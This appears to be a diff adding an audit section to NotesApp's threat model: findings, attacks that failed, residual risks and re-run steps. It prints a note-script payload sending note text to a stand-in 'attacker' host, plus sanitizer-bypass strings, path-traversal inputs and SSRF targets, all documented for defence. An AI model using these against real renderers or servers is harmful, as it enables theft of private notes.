@@ -6,7 +6,7 @@ This is the security view of NotesApp: what it protects, from whom, where the tr
 
 | Asset | Where it lives | Why it matters |
 |---|---|---|
-| **The vault**: notes, attachments, settings, tasks, bookmarks, flashcard records | `/data/vault` (and `/data/vaults/<name>` for extra vaults) | Private by nature: journals, passwords people paste into notes, work notes. Read access is the main prize; write access lets an attacker plant content (or scripts, §4.8) that the owner later opens. |
+| **The vault**: notes, attachments, settings, tasks, bookmarks, flashcard records | `/data/vault` (and `/data/vaults/<name>` for extra vaults) | Private by nature: journals, passwords people paste into notes, work notes. Read access is the main prize; write access lets an attacker plant content (or scripts, §3.8) that the owner later opens. |
 | **History** | `/data/vault/.git` | Every version of every note, including text the owner deleted. Restoring it is how an attack is undone, so its integrity matters too. |
 | **Secrets** | `/data/secrets` (mode 700): the Claude Code OAuth token or Anthropic API key, `ntfy.json`, `push.json` (the Web Push VAPID private key and the subscribed devices), the mirror token (or Compose secrets in `/run/secrets`) | Each opens something outside the app: the owner's Claude subscription or API spend, a GitHub repository holding the whole history, push notifications to the owner's phone. |
 | **Published snapshots** | `/data/publish` | Public by intent, but only what the owner published, as it was when published. |
@@ -59,7 +59,7 @@ Off unless `NOTES_PUBLISH_ENABLED=true` **and** the tailnet policy grants `funne
 ### 3.5 The browser (the SPA, raw files, the service worker)
 
 - **Admission and CSRF** (DESIGN §5.13, §5.14): Host allowlist (`421`, blocks DNS rebinding), identity allowlist (`403`), and on every mutating `/api/**` request a well-formed `X-Client-Id` (a custom header, so a cross-origin request needs a CORS preflight, which fails: there is no CORS configuration), an `Origin` equal to the `Host` when present, and a same-origin `Sec-Fetch-Site` when present. JSON endpoints accept only `application/json`; uploads accept any type but need the header too. `GET` never has side effects. `/capture/share` (the PWA share target) accepts a form `POST` but only redirects.
-- **CSP** on every page: `script-src 'self' 'wasm-unsafe-eval'`, no inline script, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, `connect-src 'self'`. `img-src` and `media-src` allow `https:`, because Obsidian notes embed remote images: **the CSP does not stop a page from loading a remote image**, so "nothing loads from other sites" is the sanitizer's job (§3.5, last item).
+- **CSP** on every page: `script-src 'self' 'wasm-unsafe-eval'`, no inline script, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, `connect-src 'self'`. `img-src` and `media-src` allow `https:`, because Obsidian notes embed remote images: **the CSP does not stop a page from loading a remote image**, so "nothing loads from other sites" is the sanitizer's job (next item).
 - **Raw files** (`/api/files/raw`, history, trash): `nosniff`, a sandbox CSP, HTML, XML and JavaScript forced to `application/octet-stream` + `attachment`, SVG inline only under `sandbox`, symlinks never served.
 - **Rendered note HTML** (reading pipeline, Live Preview widgets, embeds, script output, AI answers): DOMPurify plus the app's own rules: reserved attributes stripped (a note cannot forge an embed), no `position: fixed|sticky` or `z-index`, every remote load removed when remote images are off (always for script output and AI answers), and a `contain: paint` box around everything rendered so it cannot draw over the app.
 - **Service worker**: same-origin only; caches the app shell and content-addressed media, never API responses.
@@ -111,11 +111,52 @@ Each extra vault is its own Spring context behind `/api/v/<name>/`; the prefix i
 
 ## 5. Audit of 2026-11-02
 
-_Findings, reproductions and fixes: added as the fixes land (section 5 of this file on branch `fix/security-audit`)._
+**Method.** Code review of the backend, the web app, the service worker, the desktop shell and the clipper against §2, and an attack run against a production-like backend (`allow-default` off, a Host allowlist, an identity allowlist, publishing on, two vaults; `curl` and raw sockets) plus the web app in a real Chromium for the rendering findings. Dependencies: `npm audit` for `frontend/`, `clipper/` and `desktop/`, and every runtime Maven artifact (`mvn dependency:list`) checked against the GitHub Advisory Database (OWASP dependency-check needs the full NVD feed, which is not practical offline).
+
+### 5.1 Findings
+
+| ID | Severity | Finding | Status |
+|---|---|---|---|
+| F1 | **High** | Remote-load blocking matched URL text: `https:\\host\x`, `/\host/x`, a srcset's later candidate, `u\rl()` in a style and SVG `fill="url(https://…)"` all loaded from another site with remote images off. A **note script** (runs as the note shows, can read the whole vault) could send any note to any site: `show('<img src="https:\\\\attacker\\x?d=' + text + '">')`; so could a prompt-injected AI answer, and any note could defeat "Load remote images: off". Reproduced in Chromium. | Fixed: URLs are resolved as the browser resolves them (`render/urlSafety.ts`), DESIGN §5.14 #7 |
+| F2 | Medium | The inline-style filter split on `;` and `:` and missed `/**/position:fixed`, `p\osition:fixed` and `--p:fixed;position:var(--p)`; Live Preview callouts render note HTML without containment. A callout in a note (a clipped page, an imported vault) could cover the whole window with a fake "session expired" screen. | Fixed: only plainly spelled declarations survive; a Live Preview callout is `contain: paint` |
+| F3 | Medium | A 780 KB PDF whose content stream inflates to one 800 MB string makes PDFBox exhaust the heap; with `-XX:+ExitOnOutOfMemoryError` the JVM exits, and since PDF text is extracted at every start until cached, **one attachment put the server in a crash loop** until it was removed over SSH. | Mitigated: an extraction marker makes such a file cost one restart, after which it is indexed by name only (DESIGN §5.5.10). See R4 |
+| F4 | Low–medium | Web Push endpoints could be any `https` URL; the server posts to them, and `POST /api/reminders/test` reported the kind of failure. Any admitted caller could make the server post to `127.0.0.1`, the LAN, the Docker gateway, `169.254.169.254` or the tailnet, and port-scan them (an open HTTP port answered "plaintext connection?", a closed one `ConnectException`). | Fixed: non-public addresses refused at subscription and, after resolving the name, at every send (API.md §28.2). See R5 |
+| F5 | **Critical in that layout** | CasaOS simple layout: port `18095` is published on every host interface, so any LAN device (and the host's tailnet address) can send forged `Tailscale-User-Login` and `Host` headers and gets full access. The app cannot tell these connections from `tailscale serve`'s (§3.2). | Documented, with the firewall rules (§7.1, CASAOS.md). See R1 |
+| F6 | Low | Outside the dev profile, an empty `NOTES_IDENTITY_ALLOWED_LOGINS` (the CasaOS default) admits every Tailscale identity, users the node is shared with included, and `allow-default` admits requests without identity, both silently. | Startup warning (DESIGN §5.13); see §7.2 |
+| F7 | Medium | Dependencies with published advisories: Tomcat 11.0.24 (four critical ones, in HTTP/2 SNI checks and the FORM/DIGEST authenticators and security constraints, none of which NotesApp uses), Jackson 3.1.5 and 2.21.5 (high: parser and databind denial of service; the app parses untrusted JSON), `lodash-es` 4.17.21 under Mermaid (high: `_.template`, `_.unset`/`_.omit`; not called with untrusted input) and `nanoid` 3.3.3/4.0.2 under Excalidraw (high: only with non-integer or negative sizes). | Fixed: Spring Boot 4.1.2 (Tomcat 11.0.27, Jackson 3.1.7 and 2.21.7, Spring Framework 7.0.10); npm overrides `lodash-es` 4.18.1, `nanoid` 3.3.20 and 5.1.16. Remaining advisories: R7 |
+| F8 | Low | `push.json` (the VAPID private key) was written with the default umask and `chmod`-ed afterwards, and a secrets folder the app created was world-readable. | Fixed: created owner-only |
+| F9 | Info | The service worker accepted `/\host` as an app path for a notification's URL (`//host` to the URL parser). The URL comes from the server's own payload. | Fixed |
+| F10 | Low | Formulas run on the page's thread with no time limit: `=SUM(MMULT(SEQUENCE(800,800),SEQUENCE(800,800)))` takes 6.4 s, and cost grows with the cube of the size. A table formula or a script's `formula()` in an untrusted note can freeze the tab each time the note opens. | Open: R6 |
+| F11 | Info | The share target (`POST /capture/share`) accepts cross-site form posts; the service worker keeps their text and files in Cache Storage until `/capture` shows them. Nothing is saved without the owner's click. | Accepted |
+
+### 5.2 Attacks that failed (the controls held)
+
+- **Identity and Host**: no `Tailscale-User-Login` → `403`; a login outside the list → `403`; `Host: evil.com`, `notes.<tailnet>.ts.net.` (trailing dot) → `421`; without them only the health endpoints answer (`UP`, no details), and the actuator exposes nothing else (`/actuator/env` → `404`); the same on `/api/v/<name>/`.
+- **CSRF** on every mutating endpoint, plain and vault-prefixed: no or malformed `X-Client-Id` → `403`; a foreign `Origin` or `Sec-Fetch-Site: cross-site|same-site` → `403`; `text/plain` and form bodies → `415`; a CORS preflight gets no `Access-Control-Allow-*`; multipart is disabled; `POST /capture/share` only redirects. `GET` endpoints have no side effects, and every response is `Cross-Origin-Resource-Policy: same-origin`, so an `<img>` or `<script>` on another site cannot read a raw file.
+- **Paths**, on the file, raw, upload, history, trash and vault-prefixed routes: `..`, `%2e%2e`, `..%2f`, overlong UTF-8, fullwidth dots, `%00`, `\`, absolute and drive-letter paths, alternate data streams, trailing dots and spaces, `.git`, `.GIT`, `.notesapp`, `.trash`; an upload named `../x.svg` or `.x.svg` lands in `Attachments/` under a cleaned name; `/api/v/work/../`, `/api/v/Work/`, `%2f`, `;x=1` and `/api/v//` reach no other vault. A Windows junction to a folder outside the vault is refused for reading, writing, moving into, creating under and deleting (`400`, nothing outside touched); symbolic links get the same treatment by design (§5.3 of DESIGN.md), and are covered by `VaultPathsTest` and `FilesIntegrationTest`.
+- **Raw files**: HTML, XHTML, XML, JavaScript (`.js`, `.mjs`), `.webmanifest`, `.mht` and every unknown type are `application/octet-stream` + `attachment`; SVG is inline only under `sandbox`; PDF gets `default-src 'none'`; all with `nosniff`.
+- **Publish server**: `/p/pub/../../`, `/p/%2e%2e/`, `/api/tree`, `/P/pub` → `404`; frontmatter, `%% %%` comments, `<script>`, `onerror`, `javascript:` links and embeds of unpublished notes are absent from the snapshot.
+- **Denial of service**: `(a+)+$`-style regular expressions stop at the search timeout (`400`); 200,000-deep JSON → `400`; a 17 MB JSON body → `413` before it is read; YAML aliases are capped.
+- **Script sandbox**: no network, DOM, timers or storage in the worker; the host API is read-only with checked arguments; the global object, `Function`, indirect `eval` and prototype pollution are covered by `sandbox.test.ts`. Its one leak was F1.
+- **Desktop app and clipper**: navigation, new windows, permissions and IPC senders are checked as §3.6 and §3.7 say; nothing found.
+- **Encrypted notes**: PBKDF2-SHA512 (210,000 iterations), AES-256-GCM with a fresh IV, keys non-extractable and memory-only; drafts, the offline cache and AI requests hold only ciphertext.
+- **Elsewhere**: no XML parser (no XXE), no polymorphic JSON typing, no secret in a log line (the Claude token is passed in the environment and scrubbed from errors).
 
 ## 6. Residual risks
 
-_See section 7 for what to do about them; listed as the audit completes._
+| | Risk | What limits it |
+|---|---|---|
+| R1 | **CasaOS simple layout**: whoever reaches port `18095` is whoever they claim to be (F5). | §7.1. The sidecar layout (§3.3) or the main layout (§3.1) avoid it. |
+| R2 | Every admitted identity has full access to every vault; there are no per-user permissions. | §7.2: name the allowed logins. |
+| R3 | Content you import is code: scripts in notes run as the note shows and can read the whole vault (§3.8). After F1 they cannot send it anywhere, but they can show misleading output. | §7.5. |
+| R4 | A crafted PDF still costs one restart (F3), and other parsers (PDFBox fonts and images, Excalidraw and canvas JSON) are bounded by size and time limits rather than memory limits. | Indexing by name after a crash; `notes.search.pdf.enabled=false` turns PDF text off. |
+| R5 | Web Push: a host name that resolves to a public address at the check and to a private one at the connection (DNS rebinding) passes F4's check. Only an admitted caller can subscribe. | The tailnet policy (§7.3). |
+| R6 | Formulas (in note tables, in `.sheet` files and through a script's `formula()`) and Dataview queries run on the page's thread without a time or array-size limit (F10). | Not opening the file (§7.7); *Scripts in notes: Ask* stops scripts, not formulas. A fix would evaluate them in a worker with a deadline, or cap array sizes. |
+| R7 | Advisories with no fix that applies: `minimatch` (glob patterns; only in ESLint and in Glide Data Grid's styling, never with untrusted patterns), `opentelemetry-api` 1.62.0 under the Anthropic SDK (W3C `tracestate` parsing, which nothing feeds), and `electron-builder`'s dependencies in `desktop/` (packaging only, not shipped). | Re-run the checks of §8 when updating. |
+| R8 | AI and the mirror send note text off the tailnet when enabled (§3.9, §3.10). | Off by default; excluded folders and encrypted sections are never sent to AI. |
+| R9 | The publish server is internet-facing when Funnel is on; it is a small JDK server with no request rate limit of its own. | Tailscale Funnel in front; it serves only static snapshots. |
+
+Changes that would remove R1, R3, R4, R5 and R6 are proposed in [ROADMAP.md](ROADMAP.md) item 42.
 
 ## 7. Hardening advice
 
@@ -150,3 +191,34 @@ Scripts run as soon as a note shows. Before importing a vault or pasting notes f
 ### 7.6 Publishing
 
 Everything published is public, indexed or not. Review a note before publishing it; republishing is needed for an edit to appear, and unpublishing deletes the snapshot.
+
+### 7.7 Formulas from others
+
+Until R6 is fixed, a note or spreadsheet whose formulas build very large arrays (`SEQUENCE`, `MMULT` over hundreds of rows; the engine allows a million rows) can freeze the tab, or exhaust its memory, for as long as they compute. If a file you did not write makes the app hang whenever it opens, move or delete it from the file explorer without opening it, or remove it over SSH.
+
+## 8. Re-running the checks
+
+| Check | How |
+|---|---|
+| npm advisories | `npm audit` in `frontend/`, `clipper/` and `desktop/` (2026-11-02: 0 high; `frontend/` 17 moderate, all the one `minimatch` advisory; `clipper/` none; `desktop/` 15 moderate, all in `electron-builder`'s packaging dependencies) |
+| Maven advisories | `cd backend && ./mvnw -B -o dependency:list -DincludeScope=runtime -DoutputFile=deps.txt`, then look each `group:artifact` up in the GitHub Advisory Database (`gh api graphql` with `securityVulnerabilities(ecosystem: MAVEN, package: "group:artifact")`) and compare the version with each `vulnerableVersionRange` (2026-11-02, after F7: only `opentelemetry-api`, R7). OWASP dependency-check works too where the NVD feed can be downloaded. |
+| Admission and CSRF | `SecurityIntegrationTest`, `IdentityIntegrationTest`, `MultipleVaultsIntegrationTest`, `HostAndIdentityFilterTest`, `ApiGuardInterceptorTest`; by hand, against a backend run with `allow-default` off and a Host allowlist: `curl -H 'Host: <allowed host>' -H 'Tailscale-User-Login: <login>' …` with each header left out or changed |
+| Paths | `VaultPathsTest`, `FilesIntegrationTest`, `UploadIntegrationTest`; by hand, the inputs of §5.2 |
+| Rendering | `render/urlSafety.test.ts`, `render/render.test.ts` (security audit cases), `render/rich/rich.test.ts`, `editor/livePreview/scripts.test.ts`, `styles/containment.test.ts` |
+| Script sandbox | `scripts/sandbox.test.ts`, `scripts/host.test.ts`, `scripts/output.test.ts` |
+| Web Push destinations | `WebPushTest`, `RemindersIntegrationTest` |
+| PDF crash guard | `PdfTextTest`; end to end: a PDF whose content stream inflates to one huge string, a server started with `-Xmx256m -XX:+ExitOnOutOfMemoryError` (it exits), then started again (it logs `reading its text stopped the server last time` and stays up) |
+
+### 8.1 Commits of the 2026-11-02 audit (branch `fix/security-audit`)
+
+| Commit | What |
+|---|---|
+| `3c2451d` | This threat model |
+| `771ff1c` | F1, F2: remote loads and overlays in rendered note HTML |
+| `b2ea26e` | F9: `/\host` in a notification URL |
+| `d95d502` | A date-dependent test (`TaskDetail`) that failed from 2026-11-02 on |
+| `fb7fd76` | F4, F8: Web Push destinations; `push.json` owner-only |
+| `8f96c33` | F3: PDF crash guard |
+| `c4806cc` | F6: startup warning for an open identity configuration |
+| `fad524c` | F7: npm overrides (`lodash-es`, `nanoid`) |
+| `e62dbad` | F7: Spring Boot 4.1.2 (Tomcat, Jackson, Spring Framework) |
